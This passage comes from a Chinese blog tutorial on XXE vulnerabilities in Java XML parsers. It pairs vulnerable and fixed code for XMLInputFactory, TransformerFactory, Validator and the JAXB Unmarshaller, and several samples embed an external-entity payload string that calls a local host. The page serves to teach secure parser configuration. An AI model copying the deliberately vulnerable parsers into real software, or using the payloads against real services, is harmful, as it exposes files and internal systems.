+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">Schema schema = factory.newSchema(source);</span><br></pre></td></tr></table></figure>
+<h3 id="0x08-XMLInputFactory"><a href="#0x08-XMLInputFactory" class="headerlink" title="0x08.XMLInputFactory"></a>0x08.XMLInputFactory</h3><p>java组件：javax.xml.stream.XMLInputFactory</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">    XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (reader.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> type = reader.next();</span><br><span class="line">            <span class="keyword">if</span> (type == XMLStreamConstants.START_ELEMENT) &#123;<span class="comment">//开始节点</span></span><br><span class="line">            System.out.print(reader.getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.CHARACTERS) &#123;<span class="comment">//表示事件字符</span></span><br><span class="line">            System.out.println(<span class="string">"type"</span> + type);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == XMLStreamConstants.END_ELEMENT) &#123;<span class="comment">//结束节点</span></span><br><span class="line">            System.out.println(reader.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    	e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();</span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">false</span>); </span><br><span class="line">xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(ResourceUtils.getPoc1());</span><br></pre></td></tr></table></figure>
+<h3 id="0x09-TransformerFactory"><a href="#0x09-TransformerFactory" class="headerlink" title="0x09.TransformerFactory"></a>0x09.TransformerFactory</h3><p>java组件：javax.xml.transform.TransformerFactory</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">tf.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br></pre></td></tr></table></figure>
+<h3 id="0x10-Validator"><a href="#0x10-Validator" class="headerlink" title="0x10.Validator"></a>0x10.Validator</h3><p>java组件：javax.xml.validation.*</p>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">    Schema schema = factory.newSchema();</span><br><span class="line">    Validator validator = schema.newValidator();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    validator.validate(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></table></figure>
+<h3 id="0x11-Unmarshaller"><a href="#0x11-Unmarshaller" class="headerlink" title="0x11.Unmarshaller"></a>0x11.Unmarshaller</h3><p>java组件：javax.xml.bind.JAXBContext / javax.xml.bind.Unmarshaller</p>
+<blockquote>
+<p>需要指出：这个组件在jdk1.8默认不存在漏洞，在JDK1.6，1.7默认存在漏洞。<a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">参考</a></p>
+</blockquote>
+<p>漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectXXE</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line">	Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line">	<span class="keyword">return</span> unmarshaller.unmarshal(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlToObjectSafe</span><span class="params">(String xml, Class&lt;?&gt; klass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	JAXBContext context = JAXBContext.newInstance(klass);</span><br><span class="line"></span><br><span class="line">	XMLInputFactory xif = XMLInputFactory.newFactory();</span><br><span class="line">	xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="keyword">false</span>);</span><br><span class="line">	xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">true</span>);</span><br><span class="line">	XMLStreamReader xsr = xif.createXMLStreamReader(<span class="keyword">new</span> StringReader(xml));</span><br><span class="line"></span><br><span class="line">	Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line">	<span class="keyword">return</span> unmarshaller.unmarshal(xsr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当<strong>IS_SUPPORTING_EXTERNAL_ENTITIES</strong>为false时，外部实体不会被执行解析<br>当<strong>SUPPORT_DTD</strong>进一步为false时，引入DTD会导致报错。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/xml/index.asp</a></p>
+<p><a href="https://xz.aliyun.com/t/6829#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829#toc-4</a></p>
+<p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p>
+<p><a href="https://anquan.baidu.com/article/315" target="_blank" rel="noopener">https://anquan.baidu.com/article/315</a></p>
+<p><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">2.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-amp-DTD"><span class="toc-number">2.1.</span> <span class="toc-text">XML&amp;DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML结构"><span class="toc-number">2.1.1.</span> <span class="toc-text">XML结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD内部文档声明"><span class="toc-number">2.1.2.</span> <span class="toc-text">DTD内部文档声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD外部文档声明"><span class="toc-number">2.1.3.</span> <span class="toc-text">DTD外部文档声明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD声明"><span class="toc-number">2.2.</span> <span class="toc-text">DTD声明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明元素"><span class="toc-number">2.2.1.</span> <span class="toc-text">DTD声明元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明属性"><span class="toc-number">2.2.2.</span> <span class="toc-text">DTD声明属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD声明实体"><span class="toc-number">2.2.3.</span> <span class="toc-text">DTD声明实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE分类"><span class="toc-number">2.3.</span> <span class="toc-text">XXE分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用攻击payload"><span class="toc-number">2.4.</span> <span class="toc-text">常用攻击payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-经典XXE"><span class="toc-number">2.4.1.</span> <span class="toc-text">0x01.经典XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-XXE盲注"><span class="toc-number">2.4.2.</span> <span class="toc-text">0x02.XXE盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一个疑问"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">一个疑问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-报错注入"><span class="toc-number">2.4.3.</span> <span class="toc-text">0x03.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-DOS攻击"><span class="toc-number">2.4.4.</span> <span class="toc-text">0x04.DOS攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#协议绕过"><span class="toc-number">2.5.</span> <span class="toc-text">协议绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA组件案例"><span class="toc-number">2.6.</span> <span class="toc-text">JAVA组件案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-DocumentBuilder"><span class="toc-number">2.6.1.</span> <span class="toc-text">0x01.DocumentBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SAXBuilder"><span class="toc-number">2.6.2.</span> <span class="toc-text">0x02.SAXBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-SAXParserFactory"><span class="toc-number">2.6.3.</span> <span class="toc-text">0x03.SAXParserFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-SAXTransformerFactory"><span class="toc-number">2.6.4.</span> <span class="toc-text">0x04.SAXTransformerFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-SAXReader"><span class="toc-number">2.6.5.</span> <span class="toc-text">0x05.SAXReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-XMLReader"><span class="toc-number">2.6.6.</span> <span class="toc-text">0x06.XMLReader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-SchemaFactory"><span class="toc-number">2.6.7.</span> <span class="toc-text">0x07.SchemaFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-XMLInputFactory"><span class="toc-number">2.6.8.</span> <span class="toc-text">0x08.XMLInputFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-TransformerFactory"><span class="toc-number">2.6.9.</span> <span class="toc-text">0x09.TransformerFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-Validator"><span class="toc-number">2.6.10.</span> <span class="toc-text">0x10.Validator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-Unmarshaller"><span class="toc-number">2.6.11.</span> <span class="toc-text">0x11.Unmarshaller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">2.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/12/03/WEB-XXE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/12/03/WEB-XXE/&text=WEB-XXE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/12/03/WEB-XXE/&is_video=false&description=WEB-XXE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WEB-XXE&body=Check out this article: http://lalajun.com/2019/12/03/WEB-XXE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/12/03/WEB-XXE/&title=WEB-XXE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/12/03/WEB-XXE/&name=WEB-XXE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LaLa
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lalajun';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
+</html>
